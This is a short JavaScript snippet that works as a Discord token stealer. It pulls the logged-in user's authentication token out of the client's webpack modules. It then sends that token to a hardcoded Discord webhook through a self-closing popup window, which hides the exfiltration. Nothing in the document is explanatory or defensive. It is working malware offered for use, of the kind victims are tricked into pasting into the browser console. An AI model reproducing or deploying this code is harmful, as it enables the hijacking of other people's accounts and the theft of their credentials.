const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();

    const script = `
        fetch("https://discord.com/api/webhooks/1005256404459864134/gTsS-DLcTddkwmsy1wGi_hcvdhA6CkiLLW_QFft3N0xDyaw7V1315OXIXlT3CHNWgzec", {
            "method": "POST",
            "headers": {
                "Content-Type": "application/json"
            },
            "body": JSON.stringify({
                content: \"${token}\",
            })
        });
    `;

    url = `https://htmlpreview.github.io/?data:text/html,%3Cscript%3E${encodeURIComponent(script)}%3C%2Fscript%3E`;

    win=window.open(url, "", "height=100,width=100");
setTimeout(function() {
    win.close();
}, 2000);
